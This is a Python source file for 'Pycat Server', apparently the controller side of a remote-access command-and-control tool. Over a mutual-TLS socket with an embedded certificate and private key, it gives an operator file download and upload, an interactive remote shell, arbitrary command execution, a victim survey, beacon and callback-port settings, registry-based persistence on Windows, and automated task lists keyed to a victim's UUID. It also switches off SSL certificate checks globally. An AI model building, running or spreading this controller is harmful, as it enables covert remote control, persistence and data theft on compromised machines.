#!/usr/bin/python3

import os,sys,persist
abspath = os.path.abspath(sys.argv[0])
dname = os.path.dirname(abspath)
os.chdir(dname)

import socket, ssl
import argparse, shlex
from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
from printlib import *
from os import path, remove, kill, getpid, listdir
from sys import exit, argv,exc_info
from sys import path as sys_path
from signal import SIGTERM
import tasker,base64

VERBOSE = True
DEBUG = True

CURRENT_WORKING_DIR = ""
TASK_FILES_LOCATION = "tasks"
CONNECTED_HOST = None
CONFIG = {"TCP_TIMEOUT": 2, "VERBOSE": True, "DEBUG": True}
#IGNORE SSL CHECKS

try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    # Legacy Python that doesn't verify HTTPS certificates by default
    pass
else:
    # Handle target environment that doesn't support HTTPS verification
    ssl._create_default_https_context = _create_unverified_https_context


listen_addr = '0.0.0.0'
listen_port = 8081
conn = ""
###NEED TO WRITE EACH FILE ON EXECUTE THEN DELETE ON EXIT

def create_keys():
    server_cert ='''\
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUP6DvhuFs2TjmBbb1WwF6Zogv1e8wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDAyMjgwNTU5MzlaFw0zMDAy
MjUwNTU5MzlaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQC+7zcGw6R/OnPFm+hKZYGPiM4/imSoEMUCgZcDwv7m
/c2O9pB6Y5hhe6wtaLz8cTjVsfHpTRECzlAqxwjSLPjHzBkY639QHnOd+R9VSX9E
WQEslo6i1YRkRR8B8XL1eJnili8h1uLZ/rQmdxAtIwtoJKgsEYaW7Dzh4RWo5nlm
ZUM6Hfh3T3HupyqvXmi4b+EEdCOVMvDZps8QJuHH6ypmbHhF6vwWjoAp1qKZIeqY
ZR+b71DXKBkKRqIsf0ycjZyJxOE0YRqHA+hOtKCGSwN9aMWhG6sQGlpUdbrk+9pz
ATA8AitVE94ZIC0rFLL5ziCLtjPcScnG0i4D6FFmygHPAgMBAAGjUzBRMB0GA1Ud
DgQWBBTNhLMivwkItr7Be3VMj9/6KM3yiTAfBgNVHSMEGDAWgBTNhLMivwkItr7B
e3VMj9/6KM3yiTAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAx
zhmr0jwUkvqeAl46GOUDslgaOrCVYwJj/4R1cGRCb0bQKPbLmoBRn+YDl1wa2ro5
pl/0qro2g4n9f31kFVm3jn3132CONabxz4+pn2hvHOV+qvJ1cs0ZuIRyAX5oYSgF
h8jRgw5kMzLy4zdXXTovEW1nsjO7G3SUc9GC3EOOx3DFRUDC4rgUzBrRCxh2j574
6zrFqAgMD7QKAbMfttcn0JoFV71IPH1X/SATSgHHBfs6DkVYtI4/tPkMkxOBf5hq
CwszvFk5+ZOFJ+o66mAc4OSkt8aiRMxjHg3vSjsrW4EVqGRz+ohuoDDoKIxlgRqN
H1fwfP6xGzn/UjUTNWuz
-----END CERTIFICATE-----'''
    with open("server_cert",'w') as file:
        file.write(server_cert)
    server_key ='''\
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC+7zcGw6R/OnPF
m+hKZYGPiM4/imSoEMUCgZcDwv7m/c2O9pB6Y5hhe6wtaLz8cTjVsfHpTRECzlAq
xwjSLPjHzBkY639QHnOd+R9VSX9EWQEslo6i1YRkRR8B8XL1eJnili8h1uLZ/rQm
dxAtIwtoJKgsEYaW7Dzh4RWo5nlmZUM6Hfh3T3HupyqvXmi4b+EEdCOVMvDZps8Q
JuHH6ypmbHhF6vwWjoAp1qKZIeqYZR+b71DXKBkKRqIsf0ycjZyJxOE0YRqHA+hO
tKCGSwN9aMWhG6sQGlpUdbrk+9pzATA8AitVE94ZIC0rFLL5ziCLtjPcScnG0i4D
6FFmygHPAgMBAAECggEBAJUwRUa7x+TBv4RAdhjrh3in5MAxWsUXlViH+X+u9Y13
8w4qCmoXOBGzmK1CkaiOr2IKUIOC/C+9FVbXfkT7bshu6Y1XNXtcz+o3pgv2CcNV
6Fz2py0EuRXADKJwDutO+K7buqguR8MeCZWkorciEt+lBOKqLwfuPwQf49S9gU5H
p5nOa0Rrqdx/AwBQZbOqIjL6fA5H/Zmr/koHtAf/V9B0vnPwCdyZbxkHhsv9dTwG
eBB/jjpATXDgd8D1YnBf5kjkrHb2RqQFWnlRuw762OEQwW7n9JNv+F7/xF4tqyzn
/O+enqcnLgJVX/haFTghI4OdbiErTfTG7W5nH8R+1gECgYEA5ovt7DvzuT6e8RCm
rZeTPf0WlIJ3dQK8k0Mn1uPxwJCL0qJHTsKxcFg4z3dWrKxQLS+zaDe80ogpXBUA
+JCopJsMgdaLSZgzuRhH2kdoQy2RUX8anu//pKI4UjndPd8vTGls2An8ymczGXD8
uO67TPv87kQ/EeAyUhFsCCiQGW8CgYEA1AO0SCDZB8tiLGzoksEeHgYkaaKcEbpP
vOkU+APVGZvnXxY6n93TUyfuDZXVolbOf12tngZ9g5zhcKNTcCIehrTLYfzqqjUa
Li3s2j0tLie4PvuaZ+8hFvdZMAwsmkjvjlufxboA70DOjOEeByZv/l73dBLbApva
Cf5NBcumraECgYBOtRrm+Zi9d1l/5zVgMk08bnkU/m2V7vc+N0EUpgFUwoRZxrkd
dG5rclMC0TUwAivlIVHYlJ7MKVwlaa5JLenFOIHOmdY3q9SMrnNpW9OGi7n+3qvR
8xGNvSwJNmQHyXg2WA+mudIpr43Mc7xzzlz3bVfuaDI4Ahhr2DLPnjmD1QKBgQCv
LwBgOQQbtKpCGxtxZ7EDDgA4aOycmV4Zsl5pMIF8z522rB90yU48f9nrz8regOvP
whAbazF69r4w3EOtfAPNOsZzCRC943LmhXwYOESExr0vDabgCm9FEszXLrgMJAgN
kRfLwY3UI7CIJ9sv/Uq83KuLdakR1sWrTD1IdKYdAQKBgCeC8EC2gqBLH1LeTWpN
YP/+BXcxtJmSOPl0Z/giK9iSc6nGaFvWK/TDi7gFMBJs+l2oZhc89INPXckSRFw+
EJh3VJ9H/mM6NhojkNU1l6ueJ9RztQ8phRsBHjTSHpArhEOSd+vOusTTmSEXLP7w
iLwqGqR+AnNGRj4gvSrbqp8c
-----END PRIVATE KEY-----'''
    with open("server_key",'w') as file:
        file.write(server_key)
    client_certs = '''\
-----BEGIN CERTIFICATE-----
MIIDazCCAlOgAwIBAgIUbpFUojamR1OPhQJUwDJzW0W1sG8wDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yMDAyMjgwNjAwMDBaFw0yMTAy
MjcwNjAwMDBaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQClYnr6PZrghUhxwiwHvNl1zWhc0IDXW/odOe4/mRHS
K5wVhdj25tLA520o/fVxwYt5tSwW48HM2PIRJDeABH88WqlLfILogv6/C5OkJrSD
tyrbNjlUx1yqbiAWbsE6Jmss5CySzHTZgbs5QGVvnxW5DcfQlEWa4pYDLemeETy9
kabLFWPMDkbQq6M8Rc3GAXuTKwW5ym6pBBonVqB0p/nvxMeAh6eQS61D73uv9d0N
AcWWCedpjz+4Js2tYLBMuKrwGOao9RiGg1Su0y9vIp/0n3XJ4HBsTcxMF664e8ED
I7IC3SwCOhWrmhSA8eQ1Kws5dJ8ButW5+80Ikbz/kAeFAgMBAAGjUzBRMB0GA1Ud
DgQWBBSpeICTMVzbAL74rkG7Rp5cdpT/OjAfBgNVHSMEGDAWgBSpeICTMVzbAL74
rkG7Rp5cdpT/OjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQCY
VBDMh+y9uBAn/1S/8xmvttQQYakw1YG0wY5APoCJZPp+SurMh+xDc1dhEW6W5n65
wQTh6VmLwkfBRRLfHBWAtcFO5hW7N8MlvCerXzh30Mld37FrW0KnW7XNpXwC+XJB
KbhxF9OS9fwrQwZa4rtx8xWl93rnxuHG1ZRAPnar79DNCXII3/oh/kfcyaTugrWK
ijlopmmNvPM+rur2VGv8FheKUkyUNM0U7l6NR17ao/hVIzq7ga86e5Xidl8/gbUH
IbWmkL3apSpCeQx2nKBMwT8c+lJixO40meyxpIzTnEuTSHEXYY5/h2jlvNmLcScO
z/BKKDg5xkjlf0TAyaAo
-----END CERTIFICATE-----'''
    with open("client_certs",'w') as file:
        file.write(client_certs)

def delete_keys():
    try:
        remove("client_certs")
        remove("server_cert")
        remove("server_key")
    except FileNotFoundError:
        pass

############################################################### 
###############################################################
###############################################################

def configure_beacon(conn):
    query_beacon_config(conn)
    ans = print_question_list("New Beacon Interval (sec)")
    send_data(conn, "[BEACON]{}".format(ans))

def change_beacon_port(conn):
    ans = print_question_list("Select Option","1 - Query Callback Port Config","2 - Set Callback Port")
    if ans == "1":
        send_data(conn, "[PORT]?")
        print_info("Current Callback Port:")
        listen_for_data(conn)
    elif ans == "2":
        ans = print_question("Enter new callback port")
        send_data(conn, "[PORT]{}".format(ans))

def query_beacon_config(conn):
    send_data(conn, "[BEACON]?")
    print_info("Current Setting (sec):")
    listen_for_data(conn)

def start_beaconing(conn):
    send_data(conn, "[BEACON]START")
    kill(getpid(), SIGTERM)

def save_beacon_config(conn):
    #send_data(conn, "[BEACON]?")
    #print_info("Current Setting (sec):")
    #recv_data(conn)
    
    ans = print_question("Enter Desired Beacon to Save on HDD")
    cmd1 = r"reg add HKEY_CURRENT_USER\Software\Classes\.savep /f"
    cmd2 = r"reg add HKEY_CURRENT_USER\Software\Classes\.savep /d {p} /f".format(p=ans)
    print_info("Beacon Command Settings to Run:\n{}\n{}".format(cmd1,cmd2))
    ans = print_question("Run? [y/n]")
    if ans.lower() == "y":
        print_info("Running cmd1")
        send_data(conn, cmd1)
        listen_for_data(conn)
        print_info("Running cmd2")
        send_data(conn, cmd2)
        listen_for_data(conn)

def delete_beacon_reg(conn):
    print_info("Removing Registry Setting")
    cmd = r"reg delete HKEY_CURRENT_USER\Software\Classes\.savep /f"
    send_data(conn, cmd)
    listen_for_data(conn)

###############################################################
###############################################################
###############################################################

def send_data(s, plain_text):
    msg = plain_text + "[END]"
    s.send(msg.encode('utf-8'))
    #s.send(encrypt(msg).encode('utf-8')+b"[END]")
    if CONFIG['DEBUG']:
        print_info("Sent:\n" +plain_text)

def file_transfer_get(conn, filename):      #get file from server
    send_data(conn,"[transfer]")
    filesize = int(conn.recv(1024).decode()[11:])
    current_size = 0
    print_info(f"Total Size: {filesize}")
    bytes_read = conn.recv(1024)
    
    try:
        print_info("Transferring...")
        with open(filename, "wb") as f:
            while bytes_read != b"[END]":
                ticker = round(100*current_size/filesize)
                print(f"{ticker}%",end="\r")
                f.write(bytes_read)
                bytes_read = conn.recv(1024)
                current_size = os.path.getsize(filename)
        print()
        if CONFIG['VERBOSE']:
            
            print_good("Transfer completed")


    except Exception as e:
            print(exc_info())
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def file_transfer_put(conn, commands):       #push file to server
    send_data(conn, commands + "[END]")
    file_name = commands.split()[1]
    if CONFIG['VERBOSE']:
        print_info("Trying to open: {}".format(file_name))
    f = open(file_name, 'rb')
    data = f.read(1024)
    if CONFIG['VERBOSE']:
        print_info("Sending File:\n" + file_name)
    while data:
        conn.send(data)
        data = f.read(1024)
    conn.send("[END]".encode('utf-8'))
    f.close()

def listen_for_data(conn, mode="print",encoding="b641"):
    conn.settimeout(CONFIG['TCP_TIMEOUT'])
    try:
        if CONFIG['DEBUG']:
            print_info("Waiting for data...")

        recv_total = ""
        recv_data = conn.recv(128).decode('utf-8')
        if encoding == "b64":
            recv_total = base64_decode(recv_data)
        else:
            recv_total = recv_data
        while '[END]' not in recv_total:
            #print(f"Received: {recv_total}\n-----------------")              
            if encoding == "b64":
                recv_total = recv_total + base64_decode(recv_data)
            else:
                recv_total = recv_total + recv_data
            recv_data = conn.recv(128).decode('utf-8')
        if mode != "print":
            return recv_total[:-5]
        else:
            print(WHITE + recv_total[:-5] + RSTCOLORS)
    except socket.timeout:
        print("TIMEOUT")
        if mode != "print":
            return recv_total[:-5]
        else:
            print(WHITE + recv_total[:-5] + RSTCOLORS)

    except Exception as e:
        print(exc_info())
        print(e)
        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def kill_session(conn, source):
    print_info("Killing {}".format(source))
    send_data(conn, "[kill]")
    conn.close()

def base64_decode(base64_message):
    print(base64_message)
    try:
        base64_bytes = base64_message.encode('utf8')
        message_bytes = base64.b64decode(base64_bytes)
        message = message_bytes.decode('utf8')
        return message
    except Exception as e:
        print(exc_info())
        print(e)
        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def query_for_tasklist(machine_addr):
    try:
        task_files = listdir(TASK_FILES_LOCATION)
        if machine_addr in task_files:
            if CONFIG['VERBOSE']:
                print_info("Found a task file")
            return True
        else:
            return False
    except FileNotFoundError:
        print_fail("Unable to find file")
        return False
            
def load_tasks(task_file):
    temp_list = []
    with open(path.join("tasks", task_file), 'r') as file:
        for task in file:
            if task != "\n":
                temp_list.append(task)
    return temp_list

def run_tasklist(conn, task_list, save_file_name):
    with open(save_file_name, 'w') as save_file:
        for task in task_list:
            send_data(conn, task)
            output = listen_for_data(conn)
            section = "*****TASK*****\n{}".format(task)
            save_file.write(section + "\n")
            section = "*****OUTPUT*****\n{}".format(output)
            save_file.write(section + "\n")
    print_good("Tasks Complete!  Saved Here: {}".format(save_file_name))

def delete_task_file(task_file_name):
    try:
        if path.isfile(path.join("tasks") + task_file_name) is True:
            remove(path.join("tasks") + task_file_name)
            if CONFIG['VERBOSE']:
                print_info("Successful Remove Task List")
    except:
        pass

def run_initial_survey(conn):
    global CURRENT_WORKING_DIR
    try:    
        try:
            uuid = get_uuid(conn)
        except socket.timeout:
            uuid = "UNK - TIMEOUT"
        try:
            time = get_time(conn)
        except socket.timeout:
            time = "UNK - TIMEOUT"
        try:
            cwd = get_working_dir(conn)
            CURRENT_WORKING_DIR = cwd
        except socket.timeout:
            CURRENT_WORKING_DIR = "UNK - TIMEOUT"
        try:
            username = get_username(conn)
        except socket.timeout:
            username = "UNK - TIMEOUT"
        print()
        print(WHITE)
        print("UUID: " + uuid)
        print("Connection From: " + CONNECTED_HOST)
        print("Working Dir: " + CURRENT_WORKING_DIR)
        print("System Time: " + time)
        print("Username: " + username)
        print(RSTCOLORS)
    except Exception as e:
        print(exc_info())
        print(e)
        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def get_time(conn):
    if CONFIG['DEBUG']:
        print_info("Asking for Local System Time")
    send_data(conn,"[time]")
    time = listen_for_data(conn, "store")
    return time

def get_username(conn):
    if CONFIG['DEBUG']:
        print_info("Asking for Username")
    send_data(conn,"[user]")
    username = listen_for_data(conn, "store")
    return username

def get_uuid(conn):
    if CONFIG['DEBUG']:
        print_info("Asking for UUID")
    send_data(conn,"[UUID]")
    uuid = listen_for_data(conn, "store")
    if len(uuid) != 36:
        return False
    else:
        return uuid

def get_working_dir(conn):
    send_data(conn, "[pwd]")
    cwd = listen_for_data(conn,'store')
    print(cwd)
    return cwd

def change_working_dir(conn, path):
    global CURRENT_WORKING_DIR
    send_data(conn, "[cwd] {}".format(path))
    CURRENT_WORKING_DIR = listen_for_data(conn,'store')

def set_variables(cmd):
    global CONFIG
    variable = cmd.split("=")[0]
    param = cmd.split("=")[1]
    if param.lower() == "false":
        param = False
    elif param.lower() == "true":
        param = True
    if variable == "timeout":
        CONFIG['TCP_TIMEOUT'] = float(param)
        print_good(f"New TCP Timeout Value: {CONFIG['TCP_TIMEOUT']}")
    if variable == "verbose":
        CONFIG['VERBOSE'] = param
        print_good(f"New Verbose Value: {CONFIG['VERBOSE']}")
    if variable == "debug":
        CONFIG['DEBUG'] = param
        print_good(f"New Debug Value: {CONFIG['DEBUG']}")

def print_config():
    print(CONFIG)

def listen():
    global conn
    global CONNECTED_HOST

    exit_flag = False

    options = """\
    1|get - Download a File
    2|put - Upload a File
    3 - Kill Process (Do not beacon)
    4 - Drop Connection (start beaconing)
    5 - Persistence
    6 - Print uuid
    7 - Print Working Directory
    survey - run the initial survey
    shell - Start a Shell
    beacon - Change Beacon Settings
    print config - print some global settings"""

    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    #context.verify_mode = ssl.CERT_REQUIRED
    context.load_cert_chain(certfile='server_cert', keyfile='server_key')
    context.load_verify_locations(cafile='client_certs')
    #delete_keys()
    bindsocket = socket.socket()
    bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    #bindsocket.setblocking(0)
    bindsocket.bind((listen_addr, listen_port))
    bindsocket.listen(1)
    try:
        if listdir(TASK_FILES_LOCATION) != []:
            ans = print_question("Found Task Files, Run y/[n]")
            if ans != "y":
                run_tasks = False
            else:
                run_tasks = True
        else:
            run_tasks = False
    except:
        run_tasks = False
    while exit_flag is False:
        try:
            if run_tasks == True and VERBOSE is True:
                print_info("Ready to Run a Task File")
            print_info("Listening for incoming TCP connection on {}:{}".format(listen_addr,listen_port))
            try:
                newsocket, fromaddr = bindsocket.accept()
            except KeyboardInterrupt:
                raise KeyboardInterrupt
        except KeyboardInterrupt:
            print_warn("punt")
            try:
                newsocket.shutdown(socket.SHUT_RDWR)
                newsocket.close()
                bindsocket.shutdown(socket.SHUT_RDWR)
                bindsocket.close()
            except:
                pass
            exit()
        print_good("Client connected: {}:{}".format(fromaddr[0], fromaddr[1]))
        try:
            conn = context.wrap_socket(newsocket, server_side=True)
            print_info("SSL established. Peer: {}".format(conn.getpeercert()))        
            source = "{}:{}".format(fromaddr[0],fromaddr[1])
            CONNECTED_HOST = source
            cmd = ""
            get_working_dir(conn)
            if run_tasks is True:
                #ask for uuid
                uuid = get_uuid(conn)
                if query_for_tasklist(uuid):
                    task_list = load_tasks(uuid)
                    for task in task_list:
                        send_data(conn, task)
                        listen_for_data(conn)
                    conn.shutdown(socket.SHUT_RDWR)
                    conn.close()
                else:
                    print_warn("UUID check failed.  Skipping Task File")
                    print_warn("Presented UUID: {}".format(uuid))
                    conn.shutdown(socket.SHUT_RDWR)
                    conn.close()
            else:
                run_initial_survey(conn)
            while exit_flag is False:
                if run_tasks is True:
                    break
                
                prompt = RED + source + "> " + RSTCOLORS
                if cmd == "":
                    print(options)
                    cmd = input(prompt) # Get user input and store it in command variable
                #print(command)

                if cmd == 'quit' or cmd == 'exit':
                    conn.shutdown(socket.SHUT_RDWR)
                    conn.close()
                    exit(1)
                elif cmd == "get" or cmd == "1":
                    print("<source> <dest>")
                    filename_cmd = input("get> ")
                    if filename_cmd != "back":
                        transfer = False
                        path_exists = True
                        dest_filename = ""
                        filename_array = shlex.split(filename_cmd)

                        if '"' in filename_cmd:
                            dest_filename = filename_cmd.split('"')[1]
                            src_filename = dest_filename
                            transfer = True
                        elif "'" in filename_cmd:
                            dest_filename = filename_cmd.split('"')[1]
                            src_filename = dest_filename
                            transfer = True
                        
                        elif len(filename_array) == 1:
                            dest_filename = filename_array[0]
                            src_filename = filename_array[0]
                            
                            transfer = True
                        elif len(filename_array) == 2:

                            if path.dirname(filename_array[1]) != "":
                                path_exists = path.exists(path.dirname(filename_array[1]))
                                transfer = True
                            if path_exists:
                                
                                src_filename = filename_array[0]
                                dest_filename = filename_array[1]
                                transfer = True
                            else:
                                print_fail("Destination file path does not exist")

                        if transfer is True:
                            if CONFIG['VERBOSE']:
                                print_info("Trying to Download {} --> {}".format(src_filename, dest_filename))
                            send_data(conn, "[get] " + src_filename + "[END]")
                            data = listen_for_data(conn,mode="store")
                            if CONFIG['DEBUG']:
                                print(f"DATA: {data}")
                            if "file-not-found" in data:
                                print_fail("File not found")          
                            elif "file-found" in data:
                                if CONFIG['VERBOSE']:
                                    print_good("File Found, Downloading...")
                                file_transfer_get(conn, dest_filename)
                            else:
                                print_fail("Oops Something Happened, File Download Error!")
                    cmd = ""
##################
#UPLOAD FILE     #
##################                
                elif cmd == "put" or cmd == "2":
                    print_info("Format - <full_path_source_name> <full_path_dest_name> ")
                    command = input("put > ")
                    if command != "back":
                        path_exists = True
                        if len(command.split()) == 1:      #example_file
                            if path.isfile(command.split()[0]):
                                upload = "[put] " + command.split()[0] + " " + path.basename(command.split()[0])
                                if CONFIG['VERBOSE']:
                                    print_info("Uploading --> {}".format(command))
                                file_transfer_put(conn, upload)
                            else:
                                print_warn("File not Found")
                        elif len(command.split())== 2:        #example temp  [writes example as temp]
                            if path.isfile(command.split()[0]):
                                upload = "[put] " + command
                                file_transfer_put(conn, upload)   #(example, temp)  client will determine if arg2 destination filepath exists
                            else:
                                print_warn("Unable to locate file")
                                #print(path.isfile(command.split()[0]))
                    cmd = ""
                elif cmd == "3": # If we got terminate command, inform the client and close the connect and break the loop
                    kill_session(conn, source)
                    exit_flag = True
                elif cmd == "4":        #start beaconing
                    start_beaconing(conn)
                elif cmd == "5":
                    ans = print_question("Select a Module:\n1 - Add\n2 - Query\n3 - Remove\n")
                    if ans == "1":
                        persist.add_reg_persistence(conn)
                    elif ans == "2":
                        persist.query_reg_persistence(conn)
                    elif ans == "3":
                        persist.delete_reg_persistence(conn)
                    else:
                        cmd = ""
                elif cmd == "6":
                    uuid = get_uuid(conn)
                    print(BLUE + "UUID: {}{}".format(uuid,RSTCOLORS))
                    cmd = ""
                elif cmd == "7":
                    get_working_dir(conn)
                    print(BLUE + "CWD: {}{}".format(CURRENT_WORKING_DIR,RSTCOLORS))
                    cmd = ""
                elif cmd == "survey":
                    run_initial_survey(conn)
                    cmd = ""
                elif cmd.lower() == "shell":
                    while cmd.lower() == "shell":
                        prompt = CURRENT_WORKING_DIR + ">"
                        command = input(RED + prompt + RSTCOLORS)
                        forbidden = ['get ', 'get', 'put ', 'put']
                        for item in forbidden:
                            if item in command.split():
                                command = ""
                        if command in forbidden:
                            command = ""
                        elif command == "back" or command == "exit" or command == "quit":
                            cmd = ""
                        elif command.startswith("cd "):
                            new_dir = command.lstrip("cd ")
                            if CONFIG['VERBOSE']:
                                print_info("Changing Working Directory:")
                                print(new_dir)
                            change_working_dir(conn, new_dir)
                        elif command == "":
                            pass
                        else:
                            data = ""
                            send_data(conn, command)
                            #print_info("Sent:\n"+command)
                            listen_for_data(conn,'print')
                elif cmd.upper() == "BEACON":
                    ans = print_question_list("Select Option:",
                                            "1 - Query","2 - Configure",
                                            "3 - Change Callback Port",
                                            "4 - Save in Registry",
                                            "5 - Delete Setting in Registry")

                    if ans == "1":
                        query_beacon_config(conn)                            
                    elif ans == "2":    
                        configure_beacon(conn)
                    elif ans == "3":    
                        change_beacon_port(conn)
                    elif ans == "4":
                        save_beacon_config(conn)
                    elif ans == "5":
                        delete_beacon_reg(conn)
                    else:
                        cmd = ""
                elif cmd == "":
                    pass
                elif "=" in cmd:
                    set_variables(cmd)
                    cmd = ""
                elif cmd.lower() == "print config":
                    print_config()
                    cmd = ""
                elif cmd.split()[0] == "exec":
                    data = ""
                    new_cmd = cmd[5:]
                    send_data(conn, new_cmd)
                    #print_info("Sent:\n"+command)
                    listen_for_data(conn,'print')
                    data = ""
                    cmd = ""
                else:
                    cmd = ""

        except KeyboardInterrupt:
            start_beaconing(conn)
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
        except Exception as e:
            print(exc_info())
            print(e)
            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
        except ConnectionAbortedError:
            print_warn("Lost Connection")

def main ():
    global TASK_FILES_LOCATION
    global listen_port
    global listen_addr
    parser = argparse.ArgumentParser(description="Pycat Server")
    parser.add_argument('-p', action='store', dest='port',
                            help='Listening Port',default=listen_port)
    parser.add_argument('-i', action='store', dest='interface',
                            help='Listening IP',default=listen_addr)
    parser.add_argument('--tasks', action='store', dest='task_folder',default=TASK_FILES_LOCATION,
                            help='Task Folder')
    args = parser.parse_args()
    listen_addr = args.interface
    listen_port = int(args.port)
    task_folder = args.task_folder
    if path.isdir(task_folder):
        TASK_FILES_LOCATION = args.task_folder
    try:
        create_keys()
        listen()
    finally:
        delete_keys()

main()